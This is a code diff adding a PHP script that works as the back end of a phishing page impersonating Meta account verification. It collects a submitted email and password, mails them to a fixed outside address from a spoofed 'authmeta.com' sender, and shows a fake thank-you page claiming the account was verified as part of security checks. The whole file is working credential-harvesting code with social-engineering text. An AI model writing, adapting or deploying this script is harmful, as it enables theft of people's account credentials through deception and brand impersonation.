@@ -1,0 +1,68 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Collect form data
+    $email = htmlspecialchars($_POST['email']);
+    $password = htmlspecialchars($_POST['password']);
+
+    // Email details
+    $to = "wqu@monmouth.edu";  // Recipient email
+    $subject = "Meta Account Verification - Submitted Credentials";
+    $message = "A user attempted to log in with the following credentials:\n\n";
+    $message .= "Email: $email\n";
+    $message .= "Password: $password\n";
+
+    // Email headers
+    $headers = "From: no-reply@authmeta.com";
+
+    // Send email and display thank-you message
+    if (mail($to, $subject, $message, $headers)) {
+        echo "
+        <!DOCTYPE html>
+        <html lang='en'>
+        <head>
+            <meta charset='UTF-8'>
+            <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+            <title>Thank You</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    height: 100vh;
+                    margin: 0;
+                    background-color: #f4f4f9;
+                    text-align: center;
+                }
+                .container {
+                    max-width: 600px;
+                    padding: 20px;
+                    background: #fff;
+                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+                    border-radius: 8px;
+                }
+                h1 {
+                    font-size: 1.8rem;
+                    color: #333;
+                }
+                p {
+                    font-size: 1rem;
+                    color: #666;
+                }
+            </style>
+        </head>
+        <body>
+            <div class='container'>
+                <h1>Thank you for verifying your account security!</h1>
+                <p>Your account information has been successfully verified and updated as part of our security checks. We appreciate your prompt action to protect your account. If you need further assistance, please reach out to our support team.</p>
+            </div>
+        </body>
+        </html>
+        ";
+    } else {
+        echo "An error occurred. Please try again later.";
+    }
+} else {
+    echo "Invalid request.";
+}
+?>
